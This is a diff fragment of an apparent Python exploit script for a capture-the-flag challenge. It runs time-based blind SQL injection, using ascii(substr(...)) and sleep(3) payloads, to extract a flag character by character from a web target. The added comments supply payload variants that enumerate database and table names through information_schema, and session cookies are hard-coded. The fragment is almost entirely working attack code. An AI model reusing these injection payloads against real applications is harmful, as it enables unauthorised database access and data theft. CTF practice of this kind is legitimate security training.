@@ -5,6 +5,8 @@ for i in range(1,100):
 	cont = False
 	for x in string.printable:
 		a = time.time()
+		# nama database => substr((select database() ), i, 1)
+		# nama table => substr((select group_concat(table_name) from information_schema.tables where table_schema = "namadb" ), i, 1 )
 		injek = "' OR ((ascii(substr((select group_concat(flag) from bendera),"+ str(i) +",1))) = "+ str(ord(x)) +") AND sleep(3) ) #"
 		burp0_url = "http://ctf.asgama.web.id:45001/"
 		burp0_cookies = {"session": ".eJxtT82KgzAYfJXlO3vQdL0Ie1hIDRbyiSVRkptbrb-x0K5oU_ru-z3AnmaGmWGYF9SNGxZIrvX8aAO4rvO81K6FBPZ9X-r7-nsjAgEMDSQHFgew3JYL-S_4-KEU8iyU_juW4tyjOLlcNT06zZBfGIqyl9yEOZ9CrHBApZ_EIzOWUy6Kg2TlLEXqcEyd5N0nejsapb2pTr0ZTZQrQtU46btIsox0OqM4kq8364pYev20PNsM7VlV0N55kuPxINUU26rYjco2y3WIjDpef8E7gLVzkISEj_b-39H3H_yUWlw.DqtYyw.sbNFu_dRzCHC9JEu3rQAqUx_LCs", "PHPSESSID": "91639a933ac31cc8dbf7d47c429a99ca"}
